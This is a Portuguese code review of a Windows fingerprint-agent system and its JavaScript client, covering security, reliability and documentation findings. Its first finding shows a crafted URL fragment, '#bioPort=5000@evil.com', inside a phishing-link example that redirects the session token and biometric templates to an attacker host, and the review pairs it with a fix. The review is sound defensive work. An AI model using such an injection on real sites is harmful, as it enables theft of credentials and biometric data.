# 🔍 Revisão técnica do sistema — 2026-07-30

Revisão do branch `claude/peaceful-albattani-ngsxpk` (isolamento da `NBioBSP.dll`
em processo worker + `--autoteste`) e do sistema como um todo.

**Escopo analisado:** `main.go`, `sdk.go`, `worker.go`, `autoteste.go`, `log.go`,
`cert.go`, `origins.go`, `session.go`, `storage.go`, `supervisor.go`,
`sdk_test.go`, `worker_test.go`, `go.mod`/`go.sum`,
`integracao/integra-biometria.js`, `integracao/COMO-USAR.md`,
`instalador/instalar-servidor.ps1`, `embutir-icone.py`, `README.md`.

**Verificações executadas:** `GOOS=windows GOARCH=386 go build ./...` (OK) e
`GOOS=windows GOARCH=386 go vet ./...` (limpo). Os testes não podem ser
executados aqui — as *build tags* exigem um alvo `windows/386` real.

---

## 🔴 Problemas Críticos (bloqueia merge)

### C1. `bioPort` do fragmento da URL não é validado — token e biometria vazam para um host arbitrário

**Arquivo:** `integracao/integra-biometria.js:25-34`, `144-151`, `167-177`

```js
var h = new URLSearchParams((location.hash || '').replace(/^#/, ''))
if (h.get('bioPort')) {
  localStorage.setItem(LS_ADDR, protocolos()[0] + '://localhost:' + h.get('bioPort'))
}
```

**Por que é um problema.** O valor vindo do fragmento é concatenado direto na URL
base, sem nenhuma validação. `//localhost:` + `5000@evil.com` produz
`http://localhost:5000@evil.com` — para o `fetch`, `localhost:5000` vira
*userinfo* e o **host real passa a ser `evil.com`**. A partir daí, todas as
chamadas de `requisicao()` (`integra-biometria.js:83-101`) saem para o servidor
do atacante levando:

- o header `X-Bio-Token` com o token vivo do agente daquela sessão;
- o corpo de `/api/public/v1/captura` e `/api/public/v1/identificar`, ou seja,
  **templates biométricos em claro** — dado sensível sob a LGPD.

O endereço fica gravado em `localStorage`, então o vazamento persiste entre
recarregamentos e abas. Basta um link de phishing apontando para o site
legítimo — `https://sistema.exemplo.com/atendimento#bioPort=5000@evil.com` — e o
fragmento nem chega ao servidor do integrador, portanto não aparece em log
nenhum. O mesmo buraco existe em `Biometria.configurar({ porta })` (linha 173) e
em `conecta()` (linha 145), que confia no campo `porta` devolvido pelo
`/api/hello` sem checar o tipo.

**Como corrigir.** Validar como inteiro na faixa de escuta antes de montar o
endereço, em um ponto único:

```js
function portaValida(valor) {
  var n = Number(valor)
  return Number.isInteger(n) && n >= 1 && n <= 65535 ? n : null
}

function defineEndereco(proto, porta) {
  var p = portaValida(porta)
  if (!p) return false
  localStorage.setItem(LS_ADDR, proto + '://localhost:' + p)
  return true
}
```

E em `configurar({ endereco })`, aceitar apenas `http(s)://localhost` ou
`http(s)://127.0.0.1` (`new URL(...)` e comparar `u.hostname`), rejeitando o
resto.

---

### C2. O cliente JS descarta `ignorados` — um cadastro corrompido vira "digital não encontrada"

**Arquivo:** `integracao/integra-biometria.js:222-230`

```js
identificar: async function (tmplLido, candidatos) {
  var r = await tentaComReconexao(...)
  return { confere: !!r.confere, id: r.id || '' }   // <- ignorados some aqui
},
```

**Por que é um problema.** O lado Go faz um esforço deliberado para separar "não
é a pessoa" de "o cadastro dessa pessoa não pôde ser comparado": `sdk.go:427-480`
pula o candidato recusado por checksum em vez de abortar a busca,
`worker.go:48-51` carrega a lista através da fronteira de processo, e
`main.go:537-547` devolve `ignorados` no JSON justamente porque, nas palavras do
próprio comentário, *"sem isso o sistema lê 'não confere' e conclui que não é a
pessoa, quando na verdade o cadastro dela não pode nem ser comparado"*.

O cliente joga essa informação fora na última linha do caminho. E o
`COMO-USAR.md:52-54` ensina exatamente o padrão que transforma isso em erro
operacional:

```js
if (r.confere) alert('É o beneficiário ' + r.id);
else alert('Digital não encontrada');
```

Resultado prático: um beneficiário com o template truncado no banco é atendido
com "digital não encontrada", o atendente conclui que a pessoa é outra, e
ninguém — nem o usuário, nem o suporte — recebe qualquer sinal de que o problema
é o registro armazenado. Toda a mecânica construída no Go fica inerte.

**Como corrigir.** Propagar o campo e documentar o tratamento:

```js
identificar: async function (tmplLido, candidatos) {
  var r = await tentaComReconexao(...)
  return {
    confere: !!r.confere,
    id: r.id || '',
    ignorados: r.ignorados || [],   // cadastros que o SDK recusou
  }
},
```

e, no `COMO-USAR.md`, trocar o `else` cego por:

```js
if (r.confere) alert('É o beneficiário ' + r.id)
else if (r.ignorados.length) alert('Cadastro(s) ilegível(is): ' + r.ignorados.join(', '))
else alert('Digital não encontrada')
```

---

### C3. Identificação 1:N é um laço de comparações 1:1 — a falsa aceitação acumula

**Arquivo:** `sdk.go:427-480`

```go
for _, candidato := range candidatos {
    ...
    r, _, _ := n.verify.Call(n.h, inLida, inCandidato, saida, 0)
    ...
    if resultado != 0 {
        return candidato.ID, ignorados, nil
    }
}
```

**Por que é um problema.** `NBioAPI_VerifyMatch` é uma verificação 1:1, calibrada
para uma taxa de falsa aceitação (FAR) por comparação. Repetir a mesma
comparação contra N cadastros multiplica essa taxa: a chance de **pelo menos uma**
falsa aceitação cresce para aproximadamente `1 - (1 - FAR)^N`. Com o limite
anunciado no README (5.000 candidatos por chamada) e um FAR típico de 1/100.000,
isso é da ordem de 5% de chance de identificar a pessoa errada por chamada — e o
laço retorna no **primeiro** acerto, não no melhor, então nem sequer há como
comparar a qualidade dos candidatos empatados.

Em autorização de benefício, identificar a pessoa errada é pior do que não
identificar ninguém.

**Como corrigir.** Três caminhos, em ordem de preferência:

1. Usar a API de identificação do próprio SDK (a família `NBioAPI_Identify*` /
   FIR de payload), que aplica o limiar apropriado para 1:N.
2. Se o SDK disponível não tiver 1:N, elevar o nível de segurança na chamada de
   verificação usada dentro do laço (o último parâmetro de `VerifyMatch` aceita
   uma `NBioAPI_FIR_SECURITY_LEVEL`; hoje é passado `0`) e documentar o limiar
   escolhido.
3. Em qualquer caso, **não retornar no primeiro acerto**: percorrer a lista
   inteira e recusar quando houver mais de um candidato aprovado, devolvendo
   ambiguidade em vez de um palpite.

E, enquanto isso, reduzir `maxCandidatos` (`main.go:46`) para um valor compatível
com o FAR real medido, em vez de 5.000.

---

### C4. Uma identificação 1:N congela todas as capturas da sessão por até 3 minutos

**Arquivo:** `main.go:63,100-138,522`, `worker.go:338-345`

Todas as operações do SDK passam por uma única goroutine (`sdkThreadMain`) com
fila de 16. O prazo de uma identificação é
`30s + 25ms × len(candidatos)`, limitado a 3 minutos (`worker.go:339-342`), e o
contexto HTTP correspondente é de 4 minutos (`main.go:522`).

**Por que é um problema.** Enquanto uma identificação ocupa a goroutine do SDK,
tudo o mais fica atrás dela:

- `/api/public/v1/captura/Capturar` tem contexto de `15s + 25s = 40s`
  (`main.go:342,356`). Passado esse prazo, `naThreadSDK` desiste e o usuário
  recebe **422** — por até 3 minutos seguidos, a cada tentativa;
- `/api/status` chama `naThreadSDK(r.Context(), ...)` **sem timeout próprio**
  (`main.go:316`) e fica segurando uma vaga de `limiteHTTP` o tempo todo;
- `monitorLeitor` (`main.go:768-797`) para de atualizar o ícone da bandeja, então
  o único indicador visual do usuário congela junto.

O `limiteIdentificar` (2 vagas) limita a memória, não a fila do SDK: duas
identificações simultâneas simplesmente serializam, e a segunda espera a
primeira. Numa recepção, isso é indistinguível de queda do agente.

A correção do branch em `main.go:119-124` (tarefa cancelada não acende o leitor)
resolveu o efeito colateral — a captura fantasma —, mas não a fila.

**Como corrigir.** Separar o caminho 1:N do caminho interativo. O worker já
existe e é barato:

```go
// um cliente/worker dedicado para identificação, fora da fila de captura
var sdkIdentificacao sdkAPI
```

Alternativamente, quebrar a identificação em lotes (ex.: 250 candidatos por
tarefa) e reenfileirar entre lotes, para que capturas intercaladas consigam
passar. Em qualquer desenho, `/api/status` precisa de um timeout próprio curto
(2–3s) para não herdar a espera da fila.

---

## 🟡 Alertas (recomenda correção)

### A1. O diagnóstico parcial preservado pelo worker é descartado no handler

**Arquivo:** `main.go:524-536` vs `worker.go:129-133`

O `worker.go` comenta explicitamente que preserva o que a operação já apurou
*"(candidatos ignorados, por exemplo) ... o diagnóstico parcial não se perde"*.
Mas o handler descarta tudo quando há erro:

```go
res, err := naThreadSDK(ctx, func() (resultadoIdentificacao, error) { ... })
if err != nil {
    registraErro("identificacao: %v", err)
    escreveErro(w, http.StatusBadGateway, err.Error())   // res.ignorados jogado fora
    return
}
```

**Correção:** incluir os ignorados já apurados na resposta de erro —

```go
if err != nil {
    registraErro("identificacao: %v (ignorados ate aqui: %v)", err, res.ignorados)
    escreveJSON(w, http.StatusBadGateway, map[string]any{
        "ok": false, "erro": err.Error(),
        "ignorados": append(ignorados, res.ignorados...),
    })
    return
}
```

### A2. O `stderr` do worker não é capturado — justo o que falta para diagnosticar a queda

**Arquivo:** `worker.go:214-221`

```go
cmd := exec.Command(exe)
cmd.Stdin = leituraFilho
cmd.Stdout = escritaFilho
// cmd.Stderr fica nil -> descartado
```

Todo o propósito deste branch é descobrir por que a DLL derruba o processo. Um
*fatal error* do runtime Go, um `panic` antes do `recover`, ou a mensagem de
violação de acesso vão para o `stderr` — e são silenciosamente descartados. Só
sobra o `exit status 3221225477` registrado em `derruba()`.

**Correção:** apontar `cmd.Stderr` para um arquivo em
`garanteDiretorioDados()/worker-stderr.log` aberto em modo *append*.

### A3. Registro permanente da impressão de cada template, sem chave para desligar

**Arquivo:** `main.go:373,423-424`, `worker.go:150-151`

`registraInfo("comparacao: recebeu benef=[%s] lida=[%s]", ...)` roda em **toda**
comparação de produção, não apenas em diagnóstico. `impressaoTemplate`
(`sdk.go:378-381`) não expõe o template, mas `sha256[:6]` é um identificador
estável e correlacionável do registro biométrico de uma pessoa, gravado em claro
em `%LOCALAPPDATA%\BiometriaAgente\agente.log` (rotação de 5 MB × 1 backup,
`log.go:19-22`).

**Correção:** condicionar a variável de ambiente (`BIO_DIAGNOSTICO=1`) e, quando
ligada, usar `hmac-sha256` com uma chave aleatória por execução em vez de
`sha256` puro — continua servindo para correlacionar dentro de uma execução (que
é o caso de uso descrito no comentário) sem produzir um identificador estável
entre máquinas e arquivos de log.

### A4. Origens pendentes vencidas continuam clicáveis na bandeja

**Arquivo:** `origins.go:98-129`, `main.go:634-715`

A limpeza dos pendentes (`validadePendente = 10 min`) só acontece **dentro** de
`solicita()`, e mexe apenas no mapa. O item de menu criado em
`gerenciaMenuOrigens` (linha 668) só é removido por clique ou por "revogar
todas". Um pedido feito há três dias continua no menu, e clicar nele chama
`origens.aprova(origem)` normalmente — autorizando permanentemente uma origem
cujo pedido expirou.

Além disso, `maxOrigensPendentes = 8` é uma fila global que **qualquer página
web** pode encher (ver A5), bloqueando pedidos legítimos por 10 minutos.

**Correção:** publicar a expiração no canal (um `time.AfterFunc` por pendência,
ou um tick que compara `criadaEm`) e remover o item de menu junto; e validar em
`aprova()` que a pendência ainda existe antes de gravar.

### A5. `/api/hello` responde CORS para qualquer origem e permite disparar o pedido na bandeja

**Arquivo:** `main.go:224-241`

```go
hello := r.URL.Path == "/api/hello"
permitida := origem != "" && autorizacoes.permitida(origem)
...
if origem != "" {
    aplicaCORS(w, origem)
    if !hello && !permitida { ... 403 ... }
}
```

Qualquer página aberta na mesma sessão Windows consegue chamar `/api/hello`,
receber cabeçalhos CORS e fazer aparecer um item "Autorizar esta origem web" na
bandeja do usuário. Com `tituloOrigem` truncando em 72 caracteres
(`main.go:626-632`), um domínio longo e parecido com o legítimo aparece cortado
com `...` no menu.

O consentimento explícito continua sendo exigido, então isso não é um bypass —
mas é uma superfície de engenharia social gratuita e o vetor de DoS da fila
descrito em A4.

**Correção:** exibir a origem completa no *tooltip* do item (a truncagem só no
rótulo), e limitar pedidos pendentes por origem base/tempo (ex.: no máximo 1
pedido novo a cada 30s, independente do subdomínio).

### A6. `BIO_TOKEN_QUERY=1` aceita o token na query string

**Arquivo:** `main.go:243-246`

```go
tok := r.Header.Get("X-Bio-Token")
if tok == "" && os.Getenv("BIO_TOKEN_QUERY") == "1" {
    tok = r.URL.Query().Get("token")
}
```

Token em query string entra em histórico de navegação, `Referer` e qualquer log
de proxy no caminho. A variável não é mencionada em lugar nenhum do `README.md`
nem do `COMO-USAR.md`, então nem o operador sabe que ela existe para desligá-la.

**Correção:** remover o caminho, ou documentá-lo como exclusivo de depuração e
registrar um `registraErro` de alerta no *boot* quando estiver ligado.

### A7. `0o600` não protege nada no Windows, e `os.TempDir()` é um *fallback* perigoso

**Arquivo:** `storage.go:13-27,29-73`, `cert.go:102-107`, `main.go:604-612`

```go
var diretorioDados = func() string {
    base := os.Getenv("LOCALAPPDATA")
    if base == "" {
        base = os.TempDir()      // <- C:\Windows\Temp em vários contextos
    }
    return filepath.Join(base, "BiometriaAgente")
}
```

`os.MkdirAll(dir, 0o700)` e `f.Chmod(0o600)` no Windows só alternam o atributo
*somente leitura* — a proteção real vem inteiramente da ACL herdada do diretório
pai. Em `%LOCALAPPDATA%` isso é suficiente. No *fallback*, não: num servidor RDS,
`C:\Windows\Temp` é gravável por usuários autenticados, e nele ficariam a
**chave privada TLS** (`key.pem`) e o **token da sessão**
(`agente-<sessao>.json`) legíveis por outros usuários do mesmo servidor.

**Correção:** falhar fechado — se `LOCALAPPDATA` não estiver definido, registrar
o erro e não subir o servidor. Se o *fallback* for mesmo necessário, criar o
diretório com um descritor de segurança explícito
(`windows.CreateDirectory` com SDDL `D:P(A;OICI;GA;;;OW)`) em vez de confiar na
herança.

### A8. Sem CI, e os testes só rodam num alvo `windows/386`

**Arquivos:** ausência de `.github/workflows/`; `sdk_test.go:1`, `worker_test.go:1`

Este branch trouxe 502 linhas de teste — um ganho real —, mas todas atrás de
`//go:build windows && 386`. Sem *runner* Windows, nada disso executa em nenhum
gatilho automático: `go build`, `go vet` e `go test` dependem de alguém lembrar
de rodar na máquina certa.

E a cobertura para na fronteira do SDK: **não há um único teste** para
`middleware` (token, CORS, origem, limites), `origins.go` (aprovação,
expiração, persistência), `session.go` (isolamento entre sessões RDP),
`cert.go` ou `storage.go` — exatamente a superfície de segurança.

**Correção:** um workflow com `runs-on: windows-latest`, `GOARCH=386`,
`go vet ./... && go test ./...`; e mover os testes que não tocam a DLL
(`middleware`, `origins`, `storage`) para arquivos sem *build tag* de
arquitetura, para que rodem em qualquer runner.

### A9. `capturaEResponde` devolve 422 para falha de infraestrutura

**Arquivo:** `main.go:365-372`

```go
if err != nil || template == "" {
    ...
    escreveErro(w, http.StatusUnprocessableEntity, err.Error())
}
```

"Worker morreu", "NBioBSP.dll não encontrada" e "tempo esgotado na captura"
chegam ao navegador com o mesmo 422. O cliente
(`integra-biometria.js:73-79`) não tem como distinguir "não deu para ler o dedo,
tente de novo" de "o agente está quebrado, chame o suporte" — e o
`tentaComReconexao` não reconecta porque só reage a `reconectavel`.

**Correção:** 422 apenas para falha de leitura (`0x0201`, `0x0203`, `0x0204`);
503 para SDK indisponível/worker morto; 502 para erro interno do SDK. O
`erroSDK` já carrega o código necessário para essa decisão.

### A10. Certificado: validade só é checada no *boot*, e falha do `certutil` desliga o HTTPS em silêncio

**Arquivo:** `cert.go:92-141`, `main.go:855-859`

`carregaTLS()` roda uma única vez na subida. Se `certutil` falhar (política de
grupo, loja bloqueada), o erro é registrado e o agente segue em **HTTP puro**,
sem nenhum aviso ao usuário nem indicação na bandeja. E como a renovação só é
avaliada no *boot* (`certificadoValido`, margem de 30 dias), um agente que fique
meses de pé numa sessão RDP persistente pode servir um certificado vencido.

**Correção:** refletir `usaTLS == false` no *tooltip*/ícone da bandeja e revalidar
o certificado periodicamente (o `monitorLeitor` já é um tick natural para isso).

### A11. A descoberta no JS varre 100 portas × 2 protocolos em série

**Arquivo:** `integracao/integra-biometria.js:114-138,179-189`

Cada tentativa tem `AbortController` de 700 ms e são até 2 protocolos por porta.
No pior caso (agente ausente), `garantirConexao()` fica ~140 segundos pendurado
antes de devolver `false`.

**Correção:** disparar as sondagens em paralelo com `Promise.any` em blocos de
10 portas, e persistir a última porta bem-sucedida para tentá-la primeiro.

### A12. Sem *Job Object*: um worker travado dentro da DLL sobrevive à queda do agente

**Arquivo:** `worker.go:190-238`

O worker sai sozinho quando o `stdin` fecha — o que cobre o caso normal. Mas se
o agente morrer enquanto o worker está bloqueado dentro de `NBioAPI_Capture`, o
processo órfão fica segurando o leitor, e o supervisor sobe um agente novo que
vai tentar abrir o mesmo dispositivo.

**Correção:** criar um Job Object com `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` e
associar o worker a ele (`windows.CreateJobObject` /
`windows.AssignProcessToJobObject`), garantindo o encerramento em cascata.

### A13. `COMO-USAR.md` contradiz o código em cinco pontos

**Arquivo:** `integracao/COMO-USAR.md`

| Linha | Documento diz | Código faz |
|---|---|---|
| 114 | "CORS: já liberado pelo agente (`Access-Control-Allow-Origin: *`)" | `aplicaCORS` (`main.go:195-203`) ecoa **a origem específica**, e origem não autorizada leva 403. O `*` é inclusive rejeitado no instalador (`instalar-servidor.ps1:120`). |
| 57-58 | "se o agente for antigo (sem `/identificar`), o script cai sozinho no loop de `comparar`" | Não existe esse *fallback* no JS. Contra um agente antigo, `identificar` simplesmente falha. |
| 66-67 | auto-descoberta "sem tray e sem backend" | Origem desconhecida recebe **202 pendente** e exige aprovação na bandeja (`main.go:293-299`). |
| 89-91 | "o instalador do servidor gera um certificado ... e o registra na loja de raízes confiáveis da máquina" | Quem gera e instala é o **agente**, por usuário, a cada subida (`cert.go:115-123`, `certutil -user`). O instalador não toca em certificado. |
| 91 | caminho `agente-go/instalador/instalar-servidor.ps1` | O caminho é `instalador/instalar-servidor.ps1`. |

O item da linha 114 é o mais grave: leva o integrador a acreditar que não há
etapa de autorização, e descreve uma postura de CORS que o agente deliberadamente
não adota.

### A14. `README.md` desatualizado em relação a este branch

**Arquivo:** `README.md:161-186` (Estrutura do projeto) e seção "Configuração"

A árvore não lista `worker.go`, `autoteste.go`, `log.go` nem os arquivos de
teste — ou seja, omite justamente o isolamento de processo, que é a mudança
arquitetural mais relevante do sistema. O modo `--autoteste` (`autoteste.go`,
290 linhas) não é mencionado em nenhum lugar, embora seja a ferramenta indicada
para o problema de checksum em campo. E a tabela de variáveis não cita
`BIO_WORKER`, `BIO_WORKER_DLL`, `BIO_FILHO` nem `BIO_TOKEN_QUERY`.

**Correção:** atualizar a árvore, adicionar uma seção "Diagnóstico em campo" com
`AgenteBiometria.exe --autoteste` e o caminho do `autoteste.log`, e completar a
tabela de variáveis (marcando as internas como tal).

---

## 🟢 Sugestões (opcional)

1. **`runtime.LockOSThread` em `sdkThreadMain` virou vestigial** (`main.go:100-105`).
   Depois do isolamento, o processo agente não chama mais a DLL — quem precisa da
   thread fixa é o `workerMain` (que já a trava, `worker.go:65`). A goroutine
   continua necessária para *serializar* o acesso ao worker, mas o `LockOSThread`
   pode sair, junto de um comentário explicando que agora ela é só uma fila.

2. **Trocar `LazyProc.Call` + `uintptr(unsafe.Pointer(...))` pelos wrappers tipados**
   (`session.go:57,62,77`, `supervisor.go:22`). A conversão feita fora da lista de
   argumentos de uma função em *assembly* fica fora da garantia do compilador de
   manter o objeto vivo. Hoje é seguro porque as variáveis continuam referenciadas
   depois da chamada, mas é frágil. `golang.org/x/sys/windows` já oferece
   `GetExtendedTcpTable`, `ProcessIdToSessionId` e `CreateMutex` tipados — e a
   dependência já está no `go.mod`.

3. **Um `opEco` no worker fecharia a lacuna do autoteste** (`autoteste.go:216-266`).
   Hoje a fase 2 prova que a comparação atravessa o processo, mas nada compara a
   *impressão* do template antes e depois da travessia. Uma operação que devolva o
   template recebido permitiria afirmar byte a byte que o JSON preserva o FIR —
   que é exatamente a pergunta que motivou o `--autoteste`.

4. **`listenerMista.Close()` não fecha as conexões já aceitas** (`cert.go:257-261`).
   O que estiver no buffer `m.conns` fica sem `Close()`. Drenar o canal antes de
   retornar evita sockets pendurados no *shutdown*.

5. **`escreveConfig` não remove o arquivo de descoberta ao sair** (`main.go:586-612`).
   O `agente-<sessao>.json` sobrevive ao encerramento com um token morto dentro.
   Um `defer os.Remove(...)` em `executa()` deixa o disco limpo.

6. **Listener só em `tcp4` enquanto o cliente resolve `localhost`**
   (`main.go:556,563` vs `integra-biometria.js:120`). Quando `localhost` resolve
   para `::1` primeiro, o navegador depende do *fallback* para `127.0.0.1`. Escutar
   também em `[::1]`, ou usar `127.0.0.1` explicitamente no JS, remove a variável.

7. **Completar o mapa de erros do SDK** (`sdk.go:34-60`). As famílias `0x03xx`
   (`NBioAPIERROR_BASE_UI`) e `0x04xx` ficaram de fora e caem no texto genérico —
   o mesmo problema que motivou o mapa.

8. **`min(max, 4096)` na capacidade inicial de `cStrLimitada`** (`sdk.go:487`)
   pré-aloca 4 KB para um FIR que costuma ter alguns KB — está bom, mas vale um
   comentário dizendo de onde veio o 4096, já que `maxTemplate` é 64 KB.

---

## 📋 Resumo

- **Arquivos alterados no PR**: 9 (`autoteste.go`, `worker.go`, `worker_test.go`,
  `sdk.go`, `sdk_test.go`, `main.go`, `log.go`, `go.mod`, `go.sum`) — 1.645
  inserções, 115 remoções — mais este documento
- **Arquivos analisados**: 20
- **Segurança**: 🚨 Risco — C1 vaza token e template biométrico para host arbitrário
- **Qualidade**: ⚠️ Atenção — build e `vet` limpos, mas documentação contradiz o código em 5 pontos
- **Risco de produção**: 🚨 Alto — C3 (falsa aceitação acumulada em 1:N) e C4 (fila única do SDK)
- **Testes**: ⚠️ Parcial — 502 linhas novas cobrem SDK e worker; camada HTTP/autorização sem nenhum teste, e nada roda em CI

### Situação dos achados da revisão anterior (PR #1)

| Achado | Situação |
|---|---|
| C1 `go.sum` desatualizado | ✅ Resolvido (`1d77226`) |
| C2 Zero testes | 🟡 Parcial — `sdk_test.go` e `worker_test.go` existem; ainda sem CI e sem testes de HTTP |
| C3 1:N como laço de 1:1 | ❌ Aberto (ver C3 acima) |
| C4 `/identificar` monopoliza a thread do SDK | 🟡 Parcial — cancelamento resolvido; fila única permanece (ver C4) |
| C5 Capturas órfãs | ✅ Resolvido (`main.go:119-124` + `TestNaThreadSDKIgnoraTarefaCancelada`) |
| A12 `templateValido` sem alfabeto | ✅ Resolvido (`normalizaTemplate`, `sdk.go:354-368`) |
| A18 Log sem rotação | ✅ Resolvido (`log.go:19-22`) |
| A8, A9, A10, A11, A13, A14, A16, A17, A19 | ❌ Abertos (recontados acima) |

---

## ✅ Pontos positivos

- **O isolamento da DLL em processo worker é a decisão certa, e está bem
  fundamentada.** O comentário em `worker.go:18-23` nomeia o motivo exato — o
  handler de exceções do Go só converte em `panic` quando o endereço faltoso está
  em código Go, e uma violação de acesso dentro da NBioBSP encerra o processo sem
  passar por `recover()`. É a única arquitetura que transforma esse crash em
  "uma requisição perdida" em vez de "agente derrubado".

- **A gestão de falhas do worker é madura.** `falhasParaEsfriar`/`esperaAposFalhas`
  (`worker.go:161-164,197-199`) impedem que um template corrompido reenviado vire
  tempestade de spawn; erro devolvido pelo SDK zera o contador porque o worker
  está saudável (`worker.go:300-301`); e `derruba()` registra o *exit status* para
  distinguir saída limpa de `0xC0000005`. Cada um desses três é um detalhe que só
  aparece depois de apanhar em produção.

- **`normalizaTemplate` (`sdk.go:343-368`) tem a rigidez certa pelo motivo certo.**
  Rejeitar tudo fora de ASCII imprimível contínuo não é paranoia: o comentário
  explica que `VerifyMatch` confia nos campos de tamanho embutidos e lê fora da
  alocação, e que uma violação de acesso ali não vira `panic` recuperável. Validar
  antes de entregar à DLL é defesa em profundidade real.

- **Um cadastro corrompido não aborta mais a busca** (`sdk.go:420-480`,
  `main.go:495-521`), e a lista de ignorados atravessa o processo. O raciocínio
  registrado — *"justamente as linhas corrompidas são as que ninguém sabe que
  existem até alguém tentar usá-las"* — é a leitura certa do problema. (Falta só o
  cliente JS honrar isso; ver C2.)

- **O `--autoteste` é uma ferramenta de diagnóstico genuinamente bem desenhada.**
  Fase 1 (DLL no próprio processo, bytes crus, template contra si mesmo) e fase 2
  (mesmo par atravessando worker + JSON) isolam a variável de forma limpa: se a 1
  passa e a 2 falha, a fronteira de processo é a culpada. O `ligaConsole()` para um
  binário `-H windowsgui`, e o relatório em disco sem nenhum template dentro,
  mostram cuidado com quem vai rodar isso em campo.

- **`impressaoTemplate` resolve o dilema de observabilidade com elegância.**
  Tamanho + `sha256` curto permite seguir o mesmo registro por todo o caminho e
  flagrar truncamento por coluna curta (vários templates parando no mesmo
  tamanho), sem carregar dado biométrico. O teste
  `TestImpressaoTemplateNaoVazaOTemplate` verifica exatamente essa propriedade.

- **Os testes novos testam comportamento, não implementação.**
  `TestClienteWorkerSobreviveAMorteDoWorker`, `TestClienteWorkerDesisteDeWorkerTravado`
  e `TestNaThreadSDKIgnoraTarefaCancelada` reproduzem os modos de falha reais
  (worker morto, worker travado, tarefa cancelada na fila) usando o próprio binário
  de teste como worker falso — uma solução simples para um problema que
  normalmente exige *mock* de processo.

- **`middleware` acerta o básico de segurança**: comparação de token em tempo
  constante (`subtle.ConstantTimeCompare`), `nosniff`, `Vary: Origin`,
  `MaxBytesReader`, `DisallowUnknownFields`, recusa de JSON com objeto extra,
  `recover` por requisição, e limites de concorrência separados para o corpo de 16 MB.

---

## Veredicto: **MUDANÇAS NECESSÁRIAS**

C1 (vazamento de token e template biométrico) e C2 (cadastro corrompido
apresentado como "digital não encontrada") são correções pequenas e localizadas no
cliente JS — valem um commit imediato. C3 e C4 são estruturais e podem ser
tratados em um branch próprio, mas precisam de decisão antes de o sistema entrar
em produção com 5.000 candidatos por chamada.

O trabalho de isolamento do SDK feito neste branch é sólido e resolve o problema
mais grave que o sistema tinha. As mudanças pedidas aqui não questionam essa
direção.
